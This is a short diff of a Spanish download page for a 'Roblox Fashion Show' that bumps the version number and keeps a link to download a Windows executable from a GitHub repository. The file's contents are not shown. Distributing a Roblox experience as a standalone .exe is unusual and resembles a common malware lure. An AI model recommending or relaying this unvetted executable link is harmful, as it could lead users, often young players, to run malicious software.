@@ -1,6 +1,6 @@
 # Roblox Fashion Show · descargas
 
-**Última versión: v1.0.10** (2026-10-30)
+**Última versión: v1.0.11** (2026-10-30)
 
 [⬇️ Descargar Roblox-Fashion-Show.exe](https://github.com/cristiancordova1207/Fashion-Show-Realease/raw/main/Roblox-Fashion-Show.exe)
 
